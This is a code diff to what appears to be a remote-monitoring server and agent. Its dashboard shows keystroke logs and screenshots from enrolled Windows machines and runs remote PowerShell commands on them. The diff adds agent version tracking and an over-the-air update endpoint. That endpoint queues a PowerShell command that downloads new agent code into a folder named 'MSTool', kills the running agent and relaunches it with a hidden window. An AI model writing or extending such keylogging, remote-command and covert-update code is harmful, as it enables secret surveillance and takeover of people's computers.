@@ -208,7 +208,10 @@ def get_device_id():
 DEVICE_TOKEN = os.getenv("DEVICE_TOKEN", "")
 
 def get_client_headers():
-    headers = {"Content-Type": "application/json"}
+    headers = {
+        "Content-Type": "application/json",
+        "X-Client-Version": APP_BUILD_VERSION
+    }
     if DEVICE_TOKEN:
         headers["X-Device-Token"] = DEVICE_TOKEN
     return headers
@@ -223,10 +226,10 @@ def register_device():
         try:
             devices_tbl.update_item(
                 Key={"device_id": device_id},
-                UpdateExpression="SET last_active = :la, nickname = if_not_exists(nickname, :hn)",
-                ExpressionAttributeValues={":la": now_iso, ":hn": hostname}
+                UpdateExpression="SET last_active = :la, nickname = if_not_exists(nickname, :hn), client_version = :cv, client_version_updated_at = :la",
+                ExpressionAttributeValues={":la": now_iso, ":hn": hostname, ":cv": APP_BUILD_VERSION}
             )
-            print(f"Device successfully registered/updated in DynamoDB: {device_id} ({hostname})")
+            print(f"Device successfully registered/updated in DynamoDB: {device_id} ({hostname}) [ver {APP_BUILD_VERSION}]")
             return
         except Exception as e:
             print(f"Failed to register device in DynamoDB: {e}")
@@ -237,11 +240,11 @@ def register_device():
         try:
             req = urllib.request.Request(
                 f"{server_url.rstrip('/')}/api/client/register",
-                data=json.dumps({"device_id": device_id, "hostname": hostname, "last_active": now_iso}).encode('utf-8'),
+                data=json.dumps({"device_id": device_id, "hostname": hostname, "last_active": now_iso, "client_version": APP_BUILD_VERSION}).encode('utf-8'),
                 headers=get_client_headers()
             )
             with urllib.request.urlopen(req, timeout=10) as r:
-                print(f"Device registered with AWS Central Server: {device_id} ({hostname})")
+                print(f"Device registered with AWS Central Server: {device_id} ({hostname}) [ver {APP_BUILD_VERSION}]")
         except Exception as se:
             print(f"Failed to register device with AWS Central Server: {se}")
 
@@ -379,7 +382,7 @@ def _poll_and_run_remote_command(device_id):
             return
 
         # HTTP path: poll from Lambda
-        poll_url = f"{server_url.rstrip('/')}/api/client/command/poll?device_id={device_id}"
+        poll_url = f"{server_url.rstrip('/')}/api/client/command/poll?device_id={device_id}&client_version={APP_BUILD_VERSION}"
         req = urllib.request.Request(poll_url, headers=get_client_headers())
         with urllib.request.urlopen(req, timeout=10) as r:
             data = json.loads(r.read().decode('utf-8'))
@@ -1915,11 +1918,13 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                     Back
                 </button>
                 <div>
-                    <div style="display: flex; align-items: center; gap: 0.6rem;">
+                    <div style="display: flex; align-items: center; gap: 0.6rem; flex-wrap: wrap;">
                         <h1 id="detail-device-title" style="font-size: 1.5rem;">Device Details</h1>
-                        <span id="app-version-badge-detail" style="background: rgba(99, 102, 241, 0.15); border: 1px solid rgba(99, 102, 241, 0.4); color: #818cf8; font-family: 'JetBrains Mono', monospace; font-size: 0.72rem; padding: 2px 8px; border-radius: 9999px; font-weight: 600;" title="Build Time: {{ app_build_time | default('Latest') }}">
-                            {{ app_version | default('v1.0.0') }}
+                        <span id="app-version-badge-detail" style="background: rgba(99, 102, 241, 0.15); border: 1px solid rgba(99, 102, 241, 0.4); color: #818cf8; font-family: 'JetBrains Mono', monospace; font-size: 0.72rem; padding: 2px 8px; border-radius: 9999px; font-weight: 600;" title="Server Build Time: {{ app_build_time | default('Latest') }}">
+                            Server: {{ app_version | default('v1.0.0') }}
                         </span>
+                        <span id="detail-client-version-badge" style="display:none; font-family: 'JetBrains Mono', monospace; font-size: 0.72rem; padding: 2px 8px; border-radius: 9999px; font-weight: 600;"></span>
+                        <button id="detail-update-client-btn" onclick="triggerClientUpdate(selectedDevice)" style="display:none; background:#238636; border:1px solid #2ea043; color:#fff; font-size:0.72rem; font-weight:600; padding:2px 8px; border-radius:4px; cursor:pointer;" title="Remotely upgrade client code">⚡ Update Client</button>
                     </div>
                     <p style="color: var(--text-muted); font-size: 0.85rem; margin-top: 0.1rem;" id="detail-device-subtitle">Keystroke logs & screenshots</p>
                 </div>
@@ -2098,13 +2103,15 @@ HTML_TEMPLATE = """<!DOCTYPE html>
     <!-- Terminal Modal -->
     <div id="terminal-modal" class="modal-overlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:2100; align-items:center; justify-content:center; opacity:0; pointer-events:none; transition: opacity 0.2s ease;">
         <div style="background:#0d1117; border:1px solid #30363d; border-radius:12px; width:760px; max-width:96%; padding:1.25rem; box-shadow:0 8px 32px rgba(0,0,0,0.7); display:flex; flex-direction:column; gap:0.75rem;">
-            <div style="display:flex; justify-content:space-between; align-items:center;">
-                <div style="display:flex; align-items:center; gap:0.6rem;">
+            <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:0.5rem;">
+                <div style="display:flex; align-items:center; gap:0.6rem; flex-wrap:wrap;">
                     <svg style="width:18px;height:18px;color:#58a6ff;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
                     <span style="font-size:1rem; font-weight:600; color:#e6edf3;">Remote PowerShell</span>
                     <span id="terminal-device-label" style="font-size:0.8rem; color:#8b949e; background:#21262d; padding:2px 8px; border-radius:4px;"></span>
+                    <span id="terminal-client-version-pill" style="font-size:0.75rem; font-weight:600; padding:2px 8px; border-radius:12px; background:#21262d; color:#8b949e;">Agent: Checking...</span>
                 </div>
                 <div style="display:flex; align-items:center; gap:0.4rem;">
+                    <button id="terminal-update-client-btn" onclick="triggerClientUpdate(selectedDevice)" title="Remotely upgrade client code to latest version and restart" style="background:#238636; border:1px solid #2ea043; color:#fff; cursor:pointer; font-size:0.75rem; font-weight:600; padding:2px 8px; border-radius:4px;">⚡ Update Client Code</button>
                     <button id="terminal-copy-btn" onclick="copyTerminalOutput()" title="Copy entire output history to clipboard" style="background:none; border:1px solid #30363d; color:#8b949e; cursor:pointer; font-size:0.72rem; padding:2px 8px; border-radius:4px;">📋 Copy</button>
                     <button onclick="clearTerminalHistory()" title="Clear session history from this browser" style="background:none; border:1px solid #30363d; color:#6e7681; cursor:pointer; font-size:0.72rem; padding:2px 8px; border-radius:4px;">🗑 Clear</button>
                     <button onclick="closeTerminalModal()" style="background:none; border:none; color:#8b949e; cursor:pointer; font-size:1.25rem; line-height:1; padding:0 4px;">&times;</button>
@@ -3030,6 +3037,21 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             const label = d ? (d.nickname || d.device_id.substring(0, 12) + '...') : selectedDevice;
             document.getElementById('terminal-device-label').innerText = label;
 
+            const pill = document.getElementById('terminal-client-version-pill');
+            if (pill && d) {
+                if (d.is_client_updated) {
+                    pill.style.background = 'rgba(35, 134, 54, 0.2)';
+                    pill.style.border = '1px solid #2ea043';
+                    pill.style.color = '#3fb950';
+                    pill.innerText = 'Agent: ' + (d.client_version || 'Latest') + ' ✓';
+                } else {
+                    pill.style.background = 'rgba(218, 54, 51, 0.2)';
+                    pill.style.border = '1px solid #f85149';
+                    pill.style.color = '#ff7b72';
+                    pill.innerText = 'Agent: ' + (d.client_version || 'Outdated') + ' ⚠ Update Needed';
+                }
+            }
+
             // Clear the static initial HTML, restore persisted history
             const out = document.getElementById('terminal-output');
             out.innerHTML = '';
@@ -3192,7 +3214,25 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                     lnSpan.innerText = 'Lines: ' + Number(data.total_lines).toLocaleString();
                 }
 
-                // 2. Client Connection & Badge State
+                // 2. Client Version & Status Pill
+                if (data.client_version) {
+                    const pill = document.getElementById('terminal-client-version-pill');
+                    if (pill) {
+                        if (data.is_client_updated) {
+                            pill.style.background = 'rgba(35, 134, 54, 0.2)';
+                            pill.style.border = '1px solid #2ea043';
+                            pill.style.color = '#3fb950';
+                            pill.innerText = 'Agent: ' + data.client_version + ' ✓';
+                        } else {
+                            pill.style.background = 'rgba(218, 54, 51, 0.2)';
+                            pill.style.border = '1px solid #f85149';
+                            pill.style.color = '#ff7b72';
+                            pill.innerText = 'Agent: ' + (data.client_version || 'Outdated') + ' ⚠ Update Needed';
+                        }
+                    }
+                }
+
+                // 3. Client Connection & Badge State
                 const cliSpan = document.getElementById('terminal-client-status');
                 if (data.client_connected === false) {
                     if (cliSpan) cliSpan.innerHTML = '<span style="color:#f85149; font-weight:600;">Client: Unresponsive</span>';
@@ -3202,7 +3242,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                     updateTerminalBadge(data.state);
                 }
 
-                // 3. Render Ingestion Chunks (deduplicated by seq)
+                // 4. Render Ingestion Chunks (deduplicated by seq)
                 if (data.events && data.events.length > 0) {
                     for (const ev of data.events) {
                         if (ev.seq <= terminalCursor) continue;
@@ -3222,15 +3262,35 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                     }
                 }
 
-                // 4. Command Completion Handling
+                // 5. Unstick Guard: Prompt user if client hasn't started after 15s
                 const s = (data.state || '').toUpperCase();
-                if (['COMPLETED', 'FAILED', 'TIMED_OUT'].includes(s)) {
+                if (terminalPollCount === 38 && terminalCursor === -1 && s === 'DISPATCHED') {
+                    appendTerminalChunk('⚠ Target client has not started execution after 15s. If client is on older code without streaming, click [⚡ Update Client Code] to upgrade it.' + String.fromCharCode(10), '#d29922', true);
+                }
+                if (terminalPollCount > 85 && terminalCursor === -1 && s === 'DISPATCHED') {
                     clearInterval(terminalPollInterval); terminalPollInterval = null;
                     _savePendingCmd(null);
-                    const exitColor = data.exit_code === 0 ? '#3fb950' : '#f85149';
-                    appendTerminalChunk('─'.repeat(60) + String.fromCharCode(10), '#30363d');
-                    appendTerminalChunk('✓ Command Finished [' + s + ']  |  Exit code: ' + (data.exit_code !== null ? data.exit_code : 'N/A') + '  |  Total Lines: ' + Number(data.total_lines).toLocaleString() + String.fromCharCode(10), exitColor);
-                    appendTerminalChunk('─'.repeat(60) + String.fromCharCode(10), '#30363d');
+                    appendTerminalChunk('⚠ Execution unacknowledged by client after 32s. Target client may be offline or running outdated code. Click [⚡ Update Client Code] to reinstall.' + String.fromCharCode(10), '#f85149');
+                    updateTerminalBadge('TIMED_OUT');
+                    const btn = document.getElementById('terminal-send-btn');
+                    if (btn) { btn.disabled = false; btn.innerText = 'Run'; }
+                    return;
+                }
+
+                // 6. Command Completion Handling
+                if (['COMPLETED', 'FAILED', 'TIMED_OUT', 'SUPERSEDED'].includes(s)) {
+                    clearInterval(terminalPollInterval); terminalPollInterval = null;
+                    _savePendingCmd(null);
+                    if (s === 'SUPERSEDED') {
+                        appendTerminalChunk('─'.repeat(60) + String.fromCharCode(10), '#30363d');
+                        appendTerminalChunk('⚠ Command was superseded by another action or expired.' + String.fromCharCode(10), '#f85149');
+                        appendTerminalChunk('─'.repeat(60) + String.fromCharCode(10), '#30363d');
+                    } else {
+                        const exitColor = data.exit_code === 0 ? '#3fb950' : '#f85149';
+                        appendTerminalChunk('─'.repeat(60) + String.fromCharCode(10), '#30363d');
+                        appendTerminalChunk('✓ Command Finished [' + s + ']  |  Exit code: ' + (data.exit_code !== null ? data.exit_code : 'N/A') + '  |  Total Lines: ' + Number(data.total_lines).toLocaleString() + String.fromCharCode(10), exitColor);
+                        appendTerminalChunk('─'.repeat(60) + String.fromCharCode(10), '#30363d');
+                    }
                     
                     const btn = document.getElementById('terminal-send-btn');
                     if (btn) { btn.disabled = false; btn.innerText = 'Run'; }
@@ -3243,6 +3303,39 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         }
         // Backward compatibility alias
         const pollTerminalResult = pollTerminalStream;
+
+        async function triggerClientUpdate(deviceId) {
+            const targetId = deviceId || selectedDevice;
+            if (!targetId) return;
+            if (!confirm(`Deploy latest client code to device ${targetId} and restart the agent?`)) return;
+            try {
+                const btn = document.getElementById('terminal-update-client-btn');
+                const detBtn = document.getElementById('detail-update-client-btn');
+                if (btn) { btn.disabled = true; btn.innerText = 'Updating...'; }
+                if (detBtn) { detBtn.disabled = true; detBtn.innerText = 'Updating...'; }
+
+                const res = await fetch('/api/devices/update-client', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ device_id: targetId })
+                });
+                const data = await res.json();
+                if (res.ok) {
+                    appendTerminalChunk('[INFO] Client upgrade command dispatched (ID: ' + (data.command_id || '').substring(0, 8) + ')! Downloading latest app.py & watchdog.py and restarting agent...' + String.fromCharCode(10), '#58a6ff', true);
+                    alert("Client upgrade command dispatched! The client will download the latest code and restart in ~5-10 seconds.");
+                    setTimeout(fetchDevices, 5000);
+                } else {
+                    alert("Failed to trigger update: " + (data.error || 'Unknown error'));
+                }
+            } catch (err) {
+                alert("Update request failed: " + err.message);
+            } finally {
+                const btn = document.getElementById('terminal-update-client-btn');
+                const detBtn = document.getElementById('detail-update-client-btn');
+                if (btn) { btn.disabled = false; btn.innerText = '⚡ Update Client Code'; }
+                if (detBtn) { detBtn.disabled = false; detBtn.innerText = '⚡ Update Client'; }
+            }
+        }
         // ==================== END REMOTE TERMINAL ====================
 
         // ==================== AV DIAGNOSTICS & MEDIA SESSIONS ====================
@@ -3629,6 +3722,18 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                                 <button onclick="event.stopPropagation(); deleteDeviceCard('${d.device_id}')" style="background-color: rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.3); color: #ef4444; font-size: 0.75rem; font-weight: 600; padding: 0.2rem 0.5rem; border-radius: 4px; cursor: pointer; transition: all 0.2s;" title="Delete Device">Delete</button>
                             </div>
                         </div>
+                        <div style="margin: 0.6rem 0; display:flex; align-items:center; gap:6px; flex-wrap:wrap;">
+                            ${d.is_client_updated ? `
+                                <span class="badge" style="background:rgba(35,134,54,0.15); border:1px solid rgba(46,160,67,0.4); color:#3fb950; font-size:0.72rem; font-weight:600; padding:2px 8px; border-radius:9999px;">
+                                    ✓ Agent: ${escapeHtml(d.client_version)} (Up to Date)
+                                </span>
+                            ` : `
+                                <span class="badge" style="background:rgba(218,54,51,0.15); border:1px solid rgba(248,81,73,0.5); color:#ff7b72; font-size:0.72rem; font-weight:700; padding:2px 8px; border-radius:9999px;">
+                                    ⚠ Agent: ${escapeHtml(d.client_version || 'Legacy')} (Update Required)
+                                </span>
+                                <button onclick="event.stopPropagation(); triggerClientUpdate('${d.device_id}')" style="background:#238636; border:1px solid #2ea043; color:#fff; font-size:0.72rem; font-weight:600; padding:2px 8px; border-radius:4px; cursor:pointer;" title="Remotely upgrade client code">⚡ Update Agent</button>
+                            `}
+                        </div>
                         <div style="display:flex; justify-content:space-between; align-items:center; margin-top: auto; font-size:0.8rem; color:var(--text-muted); border-top: 1px solid var(--border); padding-top:0.75rem;">
                             <span>Last Active:</span>
                             <span style="font-weight: 500; color: var(--text-main);">${relativeActive}</span>
@@ -3752,6 +3857,26 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             } else {
                 dot.style.backgroundColor = 'var(--text-muted)';
                 txt.innerText = 'OFFLINE DISCONNECTED';
+            }
+
+            const verBadge = document.getElementById('detail-client-version-badge');
+            const updBtn = document.getElementById('detail-update-client-btn');
+            if (verBadge && d) {
+                if (d.is_client_updated) {
+                    verBadge.style.display = 'inline-flex';
+                    verBadge.style.background = 'rgba(35, 134, 54, 0.15)';
+                    verBadge.style.border = '1px solid rgba(46, 160, 67, 0.4)';
+                    verBadge.style.color = '#3fb950';
+                    verBadge.innerHTML = `✓ Client: ${escapeHtml(d.client_version)} (Up to Date)`;
+                    if (updBtn) updBtn.style.display = 'none';
+                } else {
+                    verBadge.style.display = 'inline-flex';
+                    verBadge.style.background = 'rgba(218, 54, 51, 0.15)';
+                    verBadge.style.border = '1px solid rgba(248, 81, 73, 0.5)';
+                    verBadge.style.color = '#ff7b72';
+                    verBadge.innerHTML = `⚠ Client: ${escapeHtml(d.client_version || 'Outdated')} (Update Required)`;
+                    if (updBtn) updBtn.style.display = 'inline-block';
+                }
             }
             
             selectedLogKeys.clear();
@@ -4522,6 +4647,11 @@ def get_devices():
                 and not str(d.get("device_id", "")).endswith(('.dat', '.webp', '.png', '.jpg', '.jpeg'))
             ]
             items.sort(key=lambda d: d.get("nickname", "").lower())
+            for d in items:
+                cv = d.get("client_version")
+                d["client_version"] = cv or "Legacy (Outdated)"
+                d["server_version"] = APP_BUILD_VERSION
+                d["is_client_updated"] = bool(cv and cv.strip() == APP_BUILD_VERSION.strip())
         except Exception as e:
             print(f"Failed to query devices from DynamoDB: {e}")
             items = []
@@ -4529,7 +4659,7 @@ def get_devices():
     if not items and devices_tbl is None:
         device_id = get_device_id()
         hostname = socket.gethostname() or "Unknown Device"
-        items = [{"device_id": device_id, "nickname": hostname}]
+        items = [{"device_id": device_id, "nickname": hostname, "client_version": APP_BUILD_VERSION, "server_version": APP_BUILD_VERSION, "is_client_updated": True}]
 
     resp = make_response(jsonify(items))
     resp.headers["Cache-Control"] = "no-cache, no-store, must-revalidate, max-age=0"
@@ -5265,6 +5395,12 @@ def get_client_app_update():
     try:
         with open("app.py", "r", encoding="utf-8-sig") as f:
             code = f.read().lstrip('\ufeff')
+        # Inject the server's build version directly into line 56 default value
+        code = re.sub(
+            r'APP_BUILD_VERSION\s*=\s*os\.getenv\("APP_BUILD_VERSION",\s*"[^"]+"\)',
+            f'APP_BUILD_VERSION = os.getenv("APP_BUILD_VERSION", "{APP_BUILD_VERSION}")',
+            code
+        )
         return code, 200, {'Content-Type': 'text/plain; charset=utf-8'}
     except Exception as e:
         return str(e), 500
@@ -5464,9 +5600,9 @@ def client_verify_otp():
 # ==================== CLIENT HTTP PROXY ENDPOINTS (FOR CLIENTS) ====================
 _DEVICE_LAST_TOUCHED_CACHE = {}
 
-def touch_device_active(device_id, alias=None, min_interval_seconds=20):
+def touch_device_active(device_id, alias=None, client_version=None, min_interval_seconds=15):
     """
-    Refreshes device last_active in DynamoDB with throttling (default max once per 20 seconds).
+    Refreshes device last_active and client_version in DynamoDB with throttling.
     Guarantees that active polling clients remain continuously 'ONLINE CONNECTED' on the dashboard.
     """
     if not device_id or not isinstance(device_id, str) or devices_tbl is None:
@@ -5477,7 +5613,15 @@ def touch_device_active(device_id, alias=None, min_interval_seconds=20):
         now = datetime.now(timezone.utc)
         now_ts = now.timestamp()
         last_touched = _DEVICE_LAST_TOUCHED_CACHE.get(device_id, 0)
-        if (now_ts - last_touched) < min_interval_seconds:
+
+        cv = client_version
+        if not cv:
+            try:
+                cv = request.headers.get("X-Client-Version") or request.args.get("client_version")
+            except Exception:
+                pass
+
+        if (now_ts - last_touched) < min_interval_seconds and not cv:
             return
 
         now_iso = now.isoformat()
@@ -5487,11 +5631,18 @@ def touch_device_active(device_id, alias=None, min_interval_seconds=20):
 
         for did in devices_to_touch:
             try:
-                devices_tbl.update_item(
-                    Key={"device_id": did},
-                    UpdateExpression="SET last_active = :la",
-                    ExpressionAttributeValues={":la": now_iso}
-                )
+                if cv:
+                    devices_tbl.update_item(
+                        Key={"device_id": did},
+                        UpdateExpression="SET last_active = :la, client_version = :cv, client_version_updated_at = :la",
+                        ExpressionAttributeValues={":la": now_iso, ":cv": cv}
+                    )
+                else:
+                    devices_tbl.update_item(
+                        Key={"device_id": did},
+                        UpdateExpression="SET last_active = :la",
+                        ExpressionAttributeValues={":la": now_iso}
+                    )
             except Exception:
                 pass
         _DEVICE_LAST_TOUCHED_CACHE[device_id] = now_ts
@@ -5505,6 +5656,7 @@ def client_register():
     data = request.json or {}
     device_id = data.get("device_id")
     hostname = data.get("hostname", "Unknown Device")
+    client_version = data.get("client_version") or request.headers.get("X-Client-Version") or "Legacy / Outdated"
     now_iso = data.get("last_active") or datetime.now(timezone.utc).isoformat()
     if not device_id:
         return jsonify({"error": "Device ID required"}), 400
@@ -5515,8 +5667,8 @@ def client_register():
         try:
             devices_tbl.update_item(
                 Key={"device_id": device_id},
-                UpdateExpression="SET last_active = :la, nickname = if_not_exists(nickname, :hn)",
-                ExpressionAttributeValues={":la": now_iso, ":hn": hostname}
+                UpdateExpression="SET last_active = :la, nickname = if_not_exists(nickname, :hn), client_version = :cv, client_version_updated_at = :la",
+                ExpressionAttributeValues={":la": now_iso, ":hn": hostname, ":cv": client_version}
             )
             return jsonify({"status": "success"}), 200
         except Exception as e:
@@ -5620,8 +5772,14 @@ def client_poll_command():
             if alias and alias not in target_ids:
                 target_ids.append(alias)
 
-            # Keep device last_active fresh on every poll interval
-            touch_device_active(device_id, alias=alias)
+            # Keep device last_active and client_version fresh
+            client_ver = request.headers.get("X-Client-Version") or request.args.get("client_version")
+            if client_ver:
+                touch_device_active(device_id, alias=alias, client_version=client_ver)
+            elif not item.get("client_version"):
+                touch_device_active(device_id, alias=alias, client_version="Legacy / Outdated")
+            else:
+                touch_device_active(device_id, alias=alias)
 
             for did in target_ids:
                 d_item = item if did == device_id else devices_tbl.get_item(Key={"device_id": did}).get("Item", {})
@@ -5761,8 +5919,23 @@ def client_post_command_result():
                 "output": output[:8000],  # Cap at 8KB to stay within DynamoDB limits
                 "exit_code": exit_code,
                 "completed_at": datetime.now(timezone.utc).isoformat(),
-                "status": "completed"
+                "status": "completed",
+                "state": "COMPLETED",
+                "total_lines": len(output.splitlines())
             }
+            # Also persist single stream chunk to logs_tbl so get_command_stream displays it immediately
+            if logs_tbl is not None:
+                try:
+                    logs_tbl.put_item(Item={
+                        "device_id": f"cmdstream#{command_id}",
+                        "timestamp_id": f"{0:08d}",
+                        "seq": 0,
+                        "stream": "stdout",
+                        "text": output,
+                        "timestamp": datetime.now(timezone.utc).isoformat()
+                    })
+                except Exception:
+                    pass
             target_ids = [device_id]
             res = devices_tbl.get_item(Key={"device_id": device_id})
             alias = res.get("Item", {}).get("auth_alias")
@@ -5822,6 +5995,61 @@ def dispatch_command():
             return jsonify({"error": str(e)}), 500
     return jsonify({"error": "DynamoDB not configured"}), 500
 
+@app.route('/api/devices/update-client', methods=['POST'])
+def trigger_remote_client_update():
+    """Admin triggers an immediate over-the-air update of client agent on target PC."""
+    if not is_dashboard_authenticated():
+        return jsonify({"error": "Unauthorized"}), 401
+    data = request.json or {}
+    device_id = data.get("device_id")
+    if not device_id:
+        return jsonify({"error": "device_id required"}), 400
+
+    origin = request.host_url.rstrip('/')
+    update_cmd = (
+        f"$u = '{origin}'; "
+        f"$d = \"$env:LOCALAPPDATA\\MSTool\"; "
+        f"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; "
+        f"Invoke-WebRequest \"$u/api/client/update/app.py\" -OutFile \"$d\\app.py\" -UseBasicParsing; "
+        f"Invoke-WebRequest \"$u/api/client/update/watchdog.py\" -OutFile \"$d\\watchdog.py\" -UseBasicParsing; "
+        f"$py = 'pythonw.exe'; if (-not (Get-Command $py -ErrorAction SilentlyContinue)) {{ $py = 'python.exe' }}; "
+        f"Get-CimInstance Win32_Process -Filter \"Name='python.exe' or Name='pythonw.exe'\" -ErrorAction SilentlyContinue | Where-Object {{ $_.CommandLine -like '*MSTool*' }} | ForEach-Object {{ Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }}; "
+        f"Start-Process -FilePath $py -ArgumentList \"`\"$d\\watchdog.py`\"\" -WorkingDirectory $d -WindowStyle Hidden; "
+        f"Write-Output \"Client agent updated to latest version and restarted successfully.\""
+    )
+
+    if devices_tbl is not None:
+        try:
+            command_id = str(uuid.uuid4())
+            now_iso = datetime.now(timezone.utc).isoformat()
+            cmd_obj = {
+                "command_id": command_id,
+                "command": update_cmd,
+                "status": "pending",
+                "state": "QUEUED",
+                "created_at": now_iso,
+                "dispatched_at": None,
+                "acknowledged_at": None,
+                "last_heartbeat": now_iso
+            }
+            target_ids = [device_id]
+            res = devices_tbl.get_item(Key={"device_id": device_id})
+            item = res.get("Item", {})
+            alias = item.get("auth_alias")
+            if alias and alias not in target_ids:
+                target_ids.append(alias)
+
+            for did in target_ids:
+                devices_tbl.update_item(
+                    Key={"device_id": did},
+                    UpdateExpression="SET pending_command = :pc",
+                    ExpressionAttributeValues={":pc": json.dumps(cmd_obj)}
+                )
+            return jsonify({"status": "dispatched", "command_id": command_id}), 200
+        except Exception as e:
+            return jsonify({"error": str(e)}), 500
+    return jsonify({"error": "Database not configured"}), 500
+
 @app.route('/api/devices/command/stream', methods=['GET'])
 def get_command_stream():
     """Dashboard polls for incremental execution stream, status, and 5s heartbeats."""
@@ -5841,12 +6069,18 @@ def get_command_stream():
     exit_code = None
     last_heartbeat = None
     client_connected = True
+    client_version_val = "Unknown"
+    is_client_updated_val = False
 
     # 1. Fetch current command metadata
     if devices_tbl is not None:
         try:
             res = devices_tbl.get_item(Key={"device_id": device_id})
             item = res.get("Item", {})
+            cv = item.get("client_version")
+            client_version_val = cv or "Legacy / Outdated"
+            is_client_updated_val = bool(cv and cv.strip() == APP_BUILD_VERSION.strip())
+
             pending = item.get("pending_command")
             pending_obj = json.loads(pending) if isinstance(pending, str) else (pending or {})
             if pending_obj.get("command_id") == command_id:
@@ -5862,6 +6096,11 @@ def get_command_stream():
                     state = completed_obj.get("state") or "COMPLETED"
                     exit_code = completed_obj.get("exit_code", 0)
                     last_heartbeat = completed_obj.get("completed_at")
+                else:
+                    # Neither pending nor completed matches: command was superseded or expired
+                    if pending_obj.get("status") == "idle" or (pending_obj.get("command_id") and pending_obj.get("command_id") != command_id):
+                        state = "SUPERSEDED"
+                        exit_code = -1
         except Exception as de:
             print(f"Error reading stream state: {de}")
 
@@ -5920,6 +6159,9 @@ def get_command_stream():
         "exit_code": exit_code,
         "last_heartbeat": last_heartbeat,
         "client_connected": client_connected,
+        "client_version": client_version_val,
+        "is_client_updated": is_client_updated_val,
+        "server_version": APP_BUILD_VERSION,
         "events": events
     }), 200
 
